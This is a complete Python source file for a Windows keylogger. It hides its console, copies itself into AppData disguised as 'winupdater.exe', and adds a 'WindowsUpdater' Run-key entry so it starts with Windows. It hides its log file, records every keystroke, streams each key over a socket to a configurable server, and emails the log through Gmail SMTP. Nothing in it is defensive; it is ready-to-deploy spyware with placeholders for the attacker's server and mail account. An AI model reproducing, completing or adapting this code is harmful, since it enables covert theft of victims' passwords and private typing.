import os
import sys
import socket
import smtplib
import ctypes
import shutil
import subprocess
import winreg
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

# === CONFIG ===
SERVER_IP =  'add your server ip (terminal ip)'
SERVER_PORT = 12345
EMAIL_USER = 'enter your mail here'
EMAIL_PASS = 'enter your password key'
EMAIL_TO = 'enter your mail here'
FILENAME = 'winupdater.exe'
FOLDER_NAME = 'WindowsApp'
LOG_NAME = 'logs.txt'

# === Hide Console Window ===
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# === Setup Paths ===
appdata_path = os.getenv('APPDATA')
target_dir = os.path.join(appdata_path, FOLDER_NAME)
target_path = os.path.join(target_dir, FILENAME)
log_path = os.path.join(target_dir, LOG_NAME)

# === Hide File ===
def hide_file(path):
    try:
        os.system(f'attrib +h "{path}"')
    except:
        pass

# === Copy Itself to AppData and Set Autorun ===
def setup_persistence():
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    # If not already running from target path, copy and restart from there
    if sys.executable != target_path:
        try:
            shutil.copy2(sys.executable, target_path)
            subprocess.Popen([target_path], shell=True)
            sys.exit()
        except:
            pass

    # Add to startup registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
    except:
        pass

# === Send Email with Logs ===
def send_email(log_content):
    try:
        msg = MIMEText(log_content)
        msg['Subject'] = '🔥 Keystroke Logs'
        msg['From'] = EMAIL_USER
        msg['To'] = EMAIL_TO

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL_USER, EMAIL_PASS)
        server.send_message(msg)
        server.quit()
    except:
        pass

# === Try to Send Key to Server ===
def try_send_remote(key_data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
        s.sendall(key_data.encode('utf-8'))
        s.close()
        return True
    except:
        return False

# === On Key Press ===
def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"

    if not try_send_remote(key_str):
        with open(log_path, "a") as f:
            f.write(key_str)

# === On Key Release ===
def on_release(key):
    if key == Key.esc:
        try:
            with open(log_path, "r") as f:
                content = f.read()
            send_email(content)
        except:
            pass
        return False

# === Start Up Everything ===
def main():
    setup_persistence()

    # Initialize log file
    with open(log_path, "a") as f:
        f.write("\n\n[+] Session Started\n")
    hide_file(log_path)

    # Start keylogger
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    main()
